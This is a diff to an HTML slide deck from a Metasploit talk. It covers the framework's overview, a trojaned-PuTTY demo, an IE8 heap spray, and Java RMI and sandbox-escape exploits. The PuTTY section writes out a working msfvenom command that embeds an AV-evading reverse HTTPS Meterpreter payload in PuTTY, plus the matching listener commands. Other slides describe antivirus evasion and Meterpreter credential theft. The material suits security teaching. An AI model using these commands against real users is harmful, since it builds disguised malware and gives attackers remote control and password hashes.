@@ -3,7 +3,7 @@
   <head>
     <meta charset="utf-8">
 
-    <title>Metasploit</title>
+    <title>Using Metasploit</title>
 
     <meta name="apple-mobile-web-app-capable" content="yes" />
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
@@ -73,22 +73,442 @@ text-shadow: 1px 1px 0 #000,
           <p style='float:right; padding-right: 10px'>17 January 2014</p>
         </section>
           
-        <section data-state="shaderunload">
+        <section class='bigger' data-state="shaderunload">
           <h2>Agenda</h2>
-          <ol>
+          <ul>
             <li>Overview</li>
-          </ol>
+            <li>Injected PuTTY</li>
+            <li>Web Scan & Java break-in</li>
+            <li>Java Sandbox Break-out</li>
+            <li>IE8 Heap Spray</li>
+            <li>Conclusions</li>
+          </ul>
+        </section>
+          
+        <section class='bigger'>
+          <h2>History</h2>
+          
+          <table>
+            <tr><td>2003 –</td><td>created by H.D. Moore</td></tr>
+            <tr><td>2007 –</td><td>rewritten in Ruby (from Perl)</td></tr>
+            <tr><td>2009 –</td><td>acquired by Rapid7 (still under BSD licence)</td></tr>
+          </table>
+        </section>
+          
+        <section class='bigger'>
+          <h2>What is it?</h2>
+          
+          <ul>
+            <li>a framework (collection of tools and resources)</li>
+            <li>used for penetration testing (<em>pentesting</em>)</li>
+            <li>runs on Unices and Windows</li>
+          </ul>          
+        </section>
+        
+        <section data-background="#b2b2b2">
+          <img src="res/arch.png" alt="Metasploit architecture" style="width:80%"/>
+        </section>
+          
+        <section class='bigger'>
+          <h2>Interfaces</h2>
+          <ul>
+            <li>Metasploit Framework (command line)</li>
+            <li>Metasploit Community (web based)</li>
+            <li>Metasploit Express & Pro (commercial web based)</li>
+            <li>Armitage (gui)</li>
+          </ul>
+        </section>
+          
+        <section data-background="#000">
+          <img src="res/mfsconsole.png" alt='mfsconsole' style='width: 100%'/>
         </section>
           
         <section>
-          <h1>Overview</h1>
+          <img src="res/community.png" style='width: 100%'/>
+        </section>
+          
+        <section>
+          <img src="res/armitage.png" style='width: 100%'/>
+        </section>
+          
+        <section class='bigger'>
+          <h2>Auxiliary Modules</h2>
+          <ul>
+            <li>Used for scanning, fuzzing, sniffing and others</li>
+            <li>Scanning example:
+              <ul>
+                <li>Locating the Tomcat Server administration panel.</li>
+                <li>FTP servers with anonymous access.</li>
+                <li>Bruteforce SSH servers.</li>
+                <li>Servers for capturing credentials for POP3, SMB, FTP, etc.</li>
+              </ul>
+            </li>
+          </ul>
+        </section>
+          
+        <section class='bigger'>
+          <h2>Rex library</h2>
+          <ul>
+            <li>Independent classes and modules that provide the features necesarry for the rest of the system like:
+              <ul>
+                <li>generating assembly inscructions programmatically for certain architectures;</li>
+                <li>support for usefull protocols like HTTP, SMB;</li>
+                <li>encoding;</li>
+                <li>Opcode Database interaction, etc.</li>
+              </ul>
+            </li>
+          </ul>
+        </section>
+        
+        <section class='bigger' data-state="shaderunload">
+          <h2>Basics</h2>
+          
+          <p>vulnerability → exploit → payload</p>
+        </section>
+        
+        <section class='bigger'>
+          <h2>Exploits</h2>
+          <ul>
+            <li>Active:
+              <ul>
+                <li>Run against a specific host.</li>
+                <li>Example: against a server running badly configured or vulnerable software.</li>
+              </ul>
+            </li>
+            <li>Passive:
+              <ul>
+                <li>Waiting on connections from victims.</li>
+                <li>Example: publishing a injected file, serving Java/Flash exploits on HTTP.</li>
+              </ul>
+            </li>
+          </ul>
+        </section>
+        
+        <section class='cover' data-state="shaderload">
+          <h1>Injected PuTTY</h1>
+        </section>
+        
+        <section class='bigger' data-state="shaderunload">
+          <h2>Scenario</h2>
+          <ul>
+            <li>The bad guy hosts a mirror of PuTTY which contains injected code.</li>
+            <li>He listens for connections from a specific machine.</li>
+            <li>The victim is running any recent Windows.</li>
+          </ul>
+        </section>
+        
+        <section class='bigger'>
+          <h2>Video demo</h2>
+        </section>
+        
+        <section class='bigger'>
+          <h2>Let's analyze!</h2>
+        </section>
+        
+        <section>
+          <section>
+            <h2>Injecting encoded payloads</h2>
+            <pre class='bash'><code># Downloading the latest PuTTY.
+  wget http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe
+  msfvenom \
+  -p windows/meterpreter/reverse_https `# The payload.`\
+  -e x86/shikata_ga_nai `# Encode with Shikata ga nai...`\
+  -i 25 `# ...using 25 iterations.`\
+  -f exe `# Output as a Windows EXE file.`\
+  -k `# Inject as a new thread (preserves the template behaviour.)`\
+  -x ./putty.exe `# Using PuTTY as a template.`\
+  LHOST=192.168.1.102 `# The IP to connect back to (this machine).`\
+  LPORT=443 `# Default HTTPS port (inconspicuous).`\
+  > putty_bad.exe `# The output file.`
+  python - SimpleHTTPServer 80</code></pre>
+          </section>
+
+          <section class='bigger'>
+            <h2>msfpayload</h2>
+            <p>Generates all the types of shellcodes.</p>
+            <h2>msfencode</h2>
+            <p>Encodes binary code in order to evade anti-viruses and get rid of bad characters.</p>
+            <h2>msfvenom</h2>
+            <p>The combination these two tools.</p>
+          </section>
+        </section>
+        
+        <section>
+          <h2>How supicious is this?</h2>
+          <img src="res/virustotal.png" style="width: 100%"/>
+          <ul>
+            <li>Virustotal is a free service which scans files using multiple anti-viruses.</li>
+            <li>Using it, 7 of 48 anti-viruses detect the encoded injected payload.</li>
+            <li>But they all say something different!</li>
+            <li>They heuristically detect that something is suspecious, but not the specific threat.</li>
+          </ul>
+        </section>
+        
+        <section>
+          <img src="res/virustotal2.png" style="width: 100%"/>
+        </section>
+        
+        <section>
+          <h2>Listening for victims</h2>
+          <pre class='bash'><code>$ msfconsole</code></pre>
+          <pre class='bash'><code>use exploit/multi/handler
+set payload windows/meterpreter/reverse_https
+set lport 443
+set lhost 192.168.1.102
+exploit</code></pre>
+          <p>And now wait...</p>
+        </section>
+        
+        <section class='bigger'>
+          <h2>Let's analyze more closelly.</h2>
+        </section>
+        
+        <section class='bigger'>
+          <h2>Structure of injected file</h2>
+          <p>Basic malware:</p>
+          <img src="res/mal1.png" style='width: 100%'/>
+          <p>Polymorphic malware:</p>
+          <img src="res/mal2.png" style='width: 100%'/>
+        </section>
+        
+        <section class='bigger'>
+          <h2>Why encode the payload?</h2>
+          <ul>
+            <li>The transmission protocol or the vulnerable aplication may be sensitive to certain data.</li>
+            <li>A payload is usualy encoded to make sure it can pass through and not break.</li>
+            <li>A common bad caracter is a null byte since it limits C strings.</li>
+            <li>The stub is usually very small.</li>
+          </ul>
+        </section>
+        
+        <section class='bigger'>
+          <h2>Types of encoding</h2>
+          <ul>
+            <li>polymorphic / non-polymorphic</li>
+            <li>alphanumeric / non-alphanumeric</li>
+          </ul>
+        </section>
+        
+        <section class='bigger'>
+          <h2>Polymorphic:</h2>
+          <ul>
+            <li>DWORD_XOR Encoder (15+4 bytes): Uses a random 4 byte key., </li>
+            <li>Countdown Encoder (12+0 bytes): XORs the shellcode depending on a increasing register.</li>
+            <li>FNSTENV_MOV Encoder (15+4 bytes): Uses the floating point unit (FPU) environment.</li>
+            <li>Jmp_call_additive encoder (21+4 bytes): Every DWORD is encoded with a different key depending on the previous decoding.</li>
+          </ul>
+        </section>
+        
+        <section class='bigger'>
+          <h2>Shikata ga nai</h2>
+          <ul>
+            <li>A Japanese expression meaning “it cannot be helped”.</li>
+            <li>A.k.a. Polymorphic XOR Additive Feedback Encoder.</li>
+            <li>The best rated encoder. Highly polimorphic. Difficult to understand.</li>
+          </ul>
+        </section>
+        
+        <section class='bigger'>
+          <h2>Payloads</h2>
+          <ul>
+            <li>That is not the full payload!</li>
+            <li>Self contained payloads are more stable, but usualy too big.</li>
+            <li>Windows Meterpreter is 700&nbsp;kB.</li>
+            <li>So payloads are sent in stages.</li>
+            <li>The included code only contains the stager.</li>
+            <li>(Windows provides the WinINet library that makes it easy to grab content from any URL thus keeping the stager small.)</li>
+          </ul>
+        </section>
+        
+        <section class='bigger'>
+          <h2>Stager</h2>
+          <ul>
+            <li>Establishes a connection to the attacker and processes further stages.</li>
+          </ul>
+        </section>
+        
+        <section class='bigger'>
+          <h2>Reverse HTTPS Stager</h2>
+          <ul>
+            <li>Tunnels communication over HTTP using SSL.</li>
+            <li>Advantages:
+              <ul>
+                <li>HTTPS over port 443 is permited in even in corporate environments.</li>
+                <li>Inner traffic cannot be analyzed.</li>
+                <li>HTTP doesn't mentain a TCP session.</li>
+              </ul>
+            </li>
+          </ul>
+        </section>
+        
+        <section class='bigger'>
+          <h2>Reflective DLL injection</h2>
+          <ul>
+            <li>A technique for loading code which provides a reflective loader function.</li>
+            <li>The initial code downloads more stages directly into memory (by any means: raw sockets, HTTPS etc).</li>
+            <li>The reflective loader alocated Read-Write-Execute memory and constructs the executable code there.</li>
+            <li>The code can be used as any other library.</li>
+            <li>Advantages: hard to detect. Languages like Java use JIT compilation to write code in memory and execute it.</li>
+          </ul>
+        </section>
+        
+        <section class='bigger'>
+          <h2>Some payloads:</h2>
+          <ul>
+            <li>PassiveX: circumvents firewalls by using an ActiveX control to create a hidden IE instance which can comunicate freely with the attacker.</li>
+            <li>NoNX: bypasses the no-execute bit implementation in Windows (Data Execution Prevention).</li>
+            <li>Meterpreter: the biggest and most powerful payload.</li>
+          </ul>
+        </section>
+        
+        <section class='bigger'>
+          <h2>Meterpreter</h2>
+          <ul>
+            <li>Stealthily loaded into the memory of the process without writing to disk.</li>
+            <li>It can spawn and migrate to other processes.</li>
+            <li>Uses encrypted communication by default.</li>
+            <li>Can be extended at runtime by loading other DLLs.</li>
+          </ul>
+        </section>
+        
+        <section data-state="shaderunload">
+          <h2>Meterpreter Features</h2>
+          <ul>
+            <li>cat, cd, ls, pwd, ipconfig, ps: What you expect</li>
+            <li>edit: Edit files using Vim. <span style='font-size:10px'>(cuz Emacs sux!)</span></li>
+            <li>download, upload: get and send to the victim's system.</li>
+            <li>execute: run a command</li>
+            <li>hashdump: get the SAM database (passwords file).</li>
+            <li>migrate: migrate to another process.</li>
+            <li>shell: get a standard shell (like cmd).</li>
+            <li>webcam_snap: take a webcam picture.</li>
+            <li>...and many other.</li>
+          </ul>
+        </section>
+        
+        <section class='cover' data-state="shaderload">
+          <h1>IE8 Heap Spray</h1>
+        </section>
+        
+        <section class='bigger' data-state="shaderunload">
+          <h2>Video demo</h2>
+        </section>
+        
+        <section class='bigger'>
+          <h2>Details</h2>
+          <ul>
+            <li>A HTML+JS memory corruption bug in IE 8.</li>
+            <li>Requires certain libraries to work: JRE for Windows XP SP3, Vista SP2 and 7 SP1; or Visual C++ Runtime for XP SP3.</li>
+            <li>Reason: IE doesn't sanitize user-supplied input when handling same ID property.</li>
+            <li>Uses a JS lib for heap feng shui.
+              <ul>
+                <li>Manipulates the heap layout by making heap allocations.</li>
+                <li>Depends on the specific platforms. Here: IE and Windows.</li>
+              </ul>
+            </li>
+          </ul>
+        </section>
+        
+        <section class='bigger'>
+          <h2>Heap spraying</h2>
+          <ul>
+            <li>Fills large ammounts of memory with the shellcode and NOP sleds in order to get the right locations.</li>
+            <li>It tries to compensate for the non-determinism of induced by time, chance alignments and other factors.</li>
+            <li>Takes advantage of the fact that heap allocations are usually sequential.</li>
+          </ul>
+        </section>
+        
+        <section data-background="#000">
+          <img src="res/spray.png" style="width:100%;"/>
+        </section>
+        
+        <section class='bigger' data-state="shaderunload">
+          <h2>Idea</h2>
+          <ul>
+            <li>The HTML page contains two elements with the same id (say <code>idName</code>)</li>
+            <li>The memory is sprayed with the shellcode.</li>
+            <li>Mouse events are triggered in which one element is deleted.</li>
+            <li>The ID is referenced using <code>eval('idName')</code>. (It's supposed to return the element.)</li>
+          </ul>
+        </section>
+        
+        <section class='cover' data-state="shaderload">
+          <h1>Web Scan & Java break-in</h1>
+        </section>
+        
+        <section data-state="shaderunload">
+          <h2>Video demo</h2>
+        </section>
+        
+        <section class='bigger'>
+          <h2>Details</h2>
+          <ul>
+            <li>Takes advantage of the Java RMI Server default config.</li>
+            <li>(An active exploit.)</li>
+            <li>Java Remote Method Invocation is a OOP RPC.</li>
+            <li>The default config allows loading classes from any remote HTTP location.</li>
+            <li>Bytecode Advantage(TM pending): the vulnerability works reliably across 5 different platforms and 3 architectures.</li>
+            <li>RMI method calls don't do any authentication.</li>
+          </ul>
+        </section>
+        
+        <section data-state="shaderunload">
+        </section>
+        
+        <section class='cover' data-state="shaderload">
+          <h1>Java Sandbox Break-out</h1>
+        </section>
+        
+        <section data-state="shaderunload">
+          <h2>Video demo</h2>
+        </section>
+        
+        <section class='bigger'>
+          <ul>
+            <li>Affects Oracle Java versions prior to 7u25.</li>
+            <li>Runs from an applet and escapes the Java sandbox through memory coruption bug.</li>
+            <li>It's caused by invalid array indexing in the storeImageArray() function on the native jre/bin/awt.dll.</li>
+            <li>This code calls storeImageArray and causes the coruption:</li>
+            <li><code>new AffineTransformOp(new java.awt.geom.AffineTransform(1,0,0,1,0,0), null);</code></li>
+          </ul>
+        </section>
+        
+        <section class='bigger'>
+          <table>
+            <tr><td>?</td><td>Discovered through the Packet Storm Bug Bounty program.</td></tr>
+            <tr><td>18.06.2013&nbsp;</td><td>Fixed by Oracle.</td></tr>
+            <tr><td>11.08.2013&nbsp;</td><td>Disclosed.</td></tr>
+            <tr><td>15.08.2013&nbsp;</td><td>Implemented in Metasploit.</td></tr>
+          </table>
+        </section>
+        
+        <section>
+          <h2>Prevention</h2>
+        </section>
+        
+        <section>
+          <h2>Conclusions</h2>
         </section>
         
         <section data-state="shaderunload">
           <h2>Sources</h2>
-          <ul style="font-size: 0.8em; line-height:1em;">
-            <li><a href="http://en.wikipedia.org/wiki/Code_injection">en.wikipedia.org/wiki/Code_injection</a></li>
-          </ul>          
+<pre style="font-size:16px">
+http://www.offensive-security.com/metasploit-unleashed/Auxiliary_Module_Reference
+http://en.wikipedia.org/wiki/Metasploit_Project
+http://www.exploit-db.com/wp-content/themes/exploit/docs/18532.pdf
+http://blog.strategiccyber.com/2013/06/28/staged-payloads-what-pen-testers-should-know/
+https://www.rapid7.com/db/modules/exploit/windows/browser/ms12_037_same_id
+http://www.rapid7.com/db/modules/exploit/multi/misc/java_rmi_server
+http://www.rapid7.com/db/modules/exploit/multi/browser/java_storeimagearray
+http://www.osvdb.org/82865
+https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/browser/ms12_037_same_id.rb
+http://www.exploit-db.com/exploits/27526/
+http://en.wikipedia.org/wiki/Heap_spraying
+https://www.corelan.be/index.php/2011/12/31/exploit-writing-tutorial-part-11-heap-spraying-demystified/
+http://www.levinkv.ru/bezopasnost/metasploit/metasploit-penetration-testing-cookbook-%D1%87%D0%B0%D1%81%D1%82%D1%8C-1.html
+http://www.harmonysecurity.com/files/HS-P005_ReflectiveDllInjection.pdf
+</pre>
+          
         </section>
           
         <section data-state="shaderload" data-background="#000">
